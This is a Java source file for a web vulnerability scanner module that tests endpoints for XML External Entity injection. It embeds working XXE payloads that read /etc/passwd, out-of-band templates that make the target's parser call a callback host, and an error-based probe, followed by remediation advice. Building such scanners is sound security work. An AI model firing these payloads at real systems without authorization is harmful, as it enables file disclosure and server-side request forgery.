package com.burpmax.active;

import java.util.*;
import java.util.regex.*;
import static com.burpmax.model.Finding.*;

/**
 * XML External Entity (XXE) injection probe.
 *
 * Three detection strategies, applied in order:
 *
 *  1. In-band file read
 *     Inject a SYSTEM entity pointing to file:///etc/passwd and check if the
 *     parser returns its contents. Immediate confirmation with no OOB needed.
 *
 *  2. OOB HTTP callback (blind XXE)
 *     Inject a SYSTEM entity pointing to http://<OOB-host>/xxe.
 *     A DNS or HTTP callback confirms the parser resolves external entities
 *     even when content is not echoed (most production configurations).
 *     Uses a two-stage out-of-band DTD to maximise parser compatibility:
 *       Stage 1 (inline):  <!DOCTYPE foo [<!ENTITY % remote SYSTEM "http://OOB/xxe.dtd"> %remote;]>
 *       Stage 2 (external DTD): defines %file, %eval, %exfil to send /etc/passwd content.
 *     The DTD is embedded in the payload body since BurpMax cannot serve files —
 *     this uses the simpler "blind entity existence" confirmation variant which
 *     requires only a DNS/HTTP hit, not a full data exfiltration channel.
 *
 *  3. Error-based (edge case)
 *     Some parsers throw a descriptive error when an entity references a non-existent
 *     file — the error message contains the file path or "SYSTEM" keyword.
 *     This catches parsers configured to suppress entity content but not errors.
 *
 * Only runs against XML and text/plain content-type endpoints.
 */
class XxeProbe {

    // Strategy 1: in-band file read
    private static final String XXE_INBAND =
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" +
        "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>" +
        "<foo>&xxe;</foo>";

    // Strategy 2: OOB HTTP callback — HOST replaced at runtime
    private static final String XXE_OOB_TEMPLATE =
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" +
        "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://HOST/xxe.dtd\"> %xxe;]>" +
        "<foo>xxe-oob-probe</foo>";

    // Strategy 2b: simpler entity that triggers a single DNS lookup
    private static final String XXE_OOB_DNS_TEMPLATE =
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" +
        "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://HOST/xxe\">]>" +
        "<foo>&xxe;</foo>";

    // Strategy 3: error-based — reference non-existent file to trigger descriptive error
    private static final String XXE_ERROR =
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" +
        "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///burpmax-xxe-error-trigger-nonexistent\">]>" +
        "<foo>&xxe;</foo>";

    private static final Pattern RE_PASSWD = Pattern.compile(
        "root:[x*]?:\\d+:\\d+:", Pattern.CASE_INSENSITIVE);

    private static final Pattern RE_XXE_ERROR = Pattern.compile(
        "SYSTEM|external entity|DTD|entity.*not.*found|burpmax-xxe-error",
        Pattern.CASE_INSENSITIVE);

    // ── Main entry point ──────────────────────────────────────────────────────
    static List<ActiveScanResult> probe(ProbeContext ctx, RequestBuilder rb,
                                        HttpSender sender, OobClient oob) {
        List<ActiveScanResult> results = new ArrayList<>();

        if (ctx.contentType == null) return results;
        String ctLower = ctx.contentType.toLowerCase();
        if (!ctLower.contains("xml") && !ctLower.contains("text/plain")) return results;

        // ── Strategy 1: in-band /etc/passwd ──────────────────────────────
        byte[] req1 = replaceBody(ctx.originalRequest, XXE_INBAND, ctx.contentType);
        HttpSender.Response resp1 = sender.send(ctx.service, req1);
        if (resp1 != null && RE_PASSWD.matcher(resp1.body()).find()) {
            // Confirm it's reproducible
            HttpSender.Response confirm = sender.send(ctx.service, req1);
            if (confirm != null && RE_PASSWD.matcher(confirm.body()).find()) {
                results.add(new ActiveScanResult(
                    "XML External Entity (XXE) Injection", SEV_CRITICAL,
                    "In-band XXE was confirmed - the parser read and returned /etc/passwd. " +
                    "External entity resolution is enabled, allowing an attacker to read " +
                    "any file the web server can access, perform SSRF to internal services, " +
                    "and in some configurations achieve remote code execution.",
                    "XXE payload returned /etc/passwd contents: " + trunc(resp1.body(), 150),
                    XXE_REMEDIATION, "CWE-611",
                    ctx.url, "XML body", XXE_INBAND,
                    trunc(new String(req1), 300), trunc(resp1.body(), 200),
                    req1, resp1.raw(), -1L));
                return results;  // in-band confirmed - no need for OOB
            }
        }

        // ── Strategy 3: error-based ───────────────────────────────────────
        byte[] req3 = replaceBody(ctx.originalRequest, XXE_ERROR, ctx.contentType);
        HttpSender.Response resp3 = sender.send(ctx.service, req3);
        if (resp3 != null && RE_XXE_ERROR.matcher(resp3.body() + " " + resp3.headers()).find()) {
            HttpSender.Response base = sender.send(ctx.service, ctx.originalRequest);
            String baseText = base != null ? base.body() + " " + base.headers() : "";
            if (!RE_XXE_ERROR.matcher(baseText).find()) {
                results.add(new ActiveScanResult(
                    "XML External Entity (XXE) Injection (Error-Based)", SEV_HIGH,
                    "Error-based XXE was detected - the XML parser returned an error message " +
                    "containing keywords that indicate external entity resolution was attempted. " +
                    "Although file content was not returned directly, the parser's behaviour " +
                    "confirms it processes external entities, which can be exploited for SSRF " +
                    "and potentially file disclosure via side-channel techniques.",
                    "XXE error indicator in response: " + trunc(resp3.body(), 150),
                    XXE_REMEDIATION, "CWE-611",
                    ctx.url, "XML body", XXE_ERROR,
                    trunc(new String(req3), 300), trunc(resp3.body(), 200)));
            }
        }

        // ── Strategy 2: OOB callback ──────────────────────────────────────
        if (oob != null && oob.isAvailable()) {
            // Generate a distinct OOB host per template so neither recordInjection
            // overwrites the other in the injections map (they share uniqueId otherwise).
            int templateIdx = 0;
            for (String template : List.of(XXE_OOB_DNS_TEMPLATE, XXE_OOB_TEMPLATE)) {
                String oobHost = oob.generateHost("xxe-" + templateIdx + "-" + ctx.host);
                templateIdx++;
                if (oobHost == null) continue;
                String payload  = template.replace("HOST", oobHost);
                byte[] probeReq = replaceBody(ctx.originalRequest, payload, ctx.contentType);
                // Record before sending so a callback matches even if send() returns null.
                oob.recordInjection(oobHost, "Blind XXE (OOB)", ctx.url, "XML body", payload, probeReq);
                sender.send(ctx.service, probeReq);  // fire-and-forget
            }
        }

        return results;
    }

    // ── Finding builder for OOB hits ─────────────────────────────────────────

    static ActiveScanResult buildOobFinding(OobClient.OobHit hit) {
        return new ActiveScanResult(
            "Blind XXE via Out-of-Band Interaction", SEV_CRITICAL,
            "Blind XXE was confirmed via an out-of-band callback (" + hit.interactionDetail() +
            "). The XML parser resolved an external entity pointing to the OOB host, " +
            "confirming that external entity processing is enabled even though no content " +
            "is returned in the HTTP response. A blind XXE can be exploited to exfiltrate " +
            "file contents via out-of-band DNS or HTTP channels using parameter entities.",
            "OOB interaction: " + hit.interactionDetail() + " | Payload: " + trunc(hit.payload(), 100),
            XXE_REMEDIATION, "CWE-611",
            hit.endpoint(), hit.parameter(), hit.payload(), "", hit.interactionDetail());
    }

    // ── Helpers ───────────────────────────────────────────────────────────────

    private static byte[] replaceBody(byte[] req, String newBody, String contentType) {
        String reqStr    = new String(req, java.nio.charset.StandardCharsets.ISO_8859_1);
        int    bodyStart = reqStr.indexOf("\r\n\r\n");
        if (bodyStart < 0) return req;
        String headers   = reqStr.substring(0, bodyStart + 4);
        byte[] bodyBytes = newBody.getBytes(java.nio.charset.StandardCharsets.UTF_8);
        String newHeaders = headers.replaceFirst("(?i)Content-Length:\\s*\\d+",
                "Content-Length: " + bodyBytes.length);
        if (contentType != null && !contentType.toLowerCase().contains("xml")) {
            newHeaders = newHeaders.replaceFirst("(?i)Content-Type:[^\r\n]*",
                    "Content-Type: application/xml; charset=UTF-8");
        }
        byte[] headerBytes = newHeaders.getBytes(java.nio.charset.StandardCharsets.ISO_8859_1);
        byte[] result      = new byte[headerBytes.length + bodyBytes.length];
        System.arraycopy(headerBytes, 0, result, 0, headerBytes.length);
        System.arraycopy(bodyBytes, 0, result, headerBytes.length, bodyBytes.length);
        return result;
    }

    private static String trunc(String s, int n) {
        return s == null ? "" : s.length() > n ? s.substring(0, n) + "..." : s;
    }

    private static final String XXE_REMEDIATION =
        "PRIMARY FIX - Disable External Entity Processing:\n" +
        "Java (JAXP): factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true)\n" +
        "Java (DOM):  factory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true)\n" +
        "Python:      defusedxml library instead of stdlib xml.etree\n" +
        ".NET:        XmlReaderSettings { DtdProcessing = DtdProcessing.Prohibit }\n" +
        "PHP:         libxml_disable_entity_loader(true) (PHP < 8.0), use SimpleXML safely\n\n" +
        "SECONDARY CONTROLS:\n" +
        "- Switch to JSON: if XML is not required by the business, replace with JSON to\n" +
        "  eliminate the entire XXE attack surface.\n" +
        "- Least privilege: the web server process must not have read access to /etc, /proc,\n" +
        "  or other sensitive filesystem paths. Use a dedicated low-privilege service account.\n" +
        "- Egress filtering: block outbound HTTP/DNS from the app tier at the network level\n" +
        "  to prevent OOB data exfiltration even if XXE is present.\n" +
        "- SSRF via XXE: note that XXE can also trigger SSRF to internal services -\n" +
        "  apply the same egress controls as for SSRF findings.";
}
